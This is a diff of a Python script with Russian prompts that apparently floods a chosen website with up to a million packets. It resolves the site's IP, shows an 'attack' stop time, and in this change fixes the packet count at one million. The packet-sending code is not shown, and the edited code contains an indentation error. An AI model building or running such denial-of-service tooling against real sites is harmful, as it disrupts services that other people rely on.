@@ -37,7 +37,7 @@ print
 site = input('Имя сайта: ')
 ip = socket.gethostbyname(site)
 print ('searching...')
-time.sleep(2)
+time.sleep(1)
 print ('Site IP: ',ip)
 print()
 print('##########################################')
@@ -56,14 +56,14 @@ stopminute = minute + limit
 print('Stop site attack in: %s:%s'%(hour,stopminute))
 print('Maximum: 1 000 000 packs')
 print()
-igonext = ''
-print
-igonext = input('Изминить максимальное кол-во пакетов(Да/Нет): ')
-if igonext[1] == 'Д':
-            print
-            maxpack = int(input('Сколько пакетов отправить: '))
-            mil = maxpack
-if igonext[1] == 'Н':
+#igonext = ''
+#print
+#igonext = input('Изминить максимальное кол-во пакетов(Да/Нет): ')
+#if igonext[1] == 'Д':
+            #print
+            #maxpack = int(input('Сколько пакетов отправить: '))
+            #mil = maxpack
+#if igonext[1] == 'Н':
             mil = 1000000
 print()
 print('##########################################')
